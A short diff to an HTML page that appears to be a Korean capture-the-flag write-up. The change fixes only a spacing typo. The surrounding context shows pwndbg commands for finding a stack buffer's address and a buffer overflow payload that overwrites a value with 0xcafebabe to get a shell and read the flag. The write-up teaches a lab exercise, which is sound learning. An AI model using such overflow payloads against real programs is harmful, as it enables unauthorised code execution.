@@ -39,7 +39,7 @@ pwndbg&gt; info registers
 pwndbg&gt; find &lt;ebp&gt; &lt;biggest stack addr&gt; 0xdeadbeef # getting address that you want to smash
 pwndbg&gt; p $ebp - 0xac # getting address of vulnerable buffer
 </code></pre>
-<p>이후 다음과 같이 페이로드를 보내어 쉘을 탈취할 수있습니다</p>
+<p>이후 다음과 같이 페이로드를 보내어 쉘을 탈취할 수 있습니다</p>
 <pre><code>payload: b'A' * &lt;offset of them&gt; + p32(0xcafebabe) or b'\xbe\xba\xfe\xca'
 ls
 cat flag
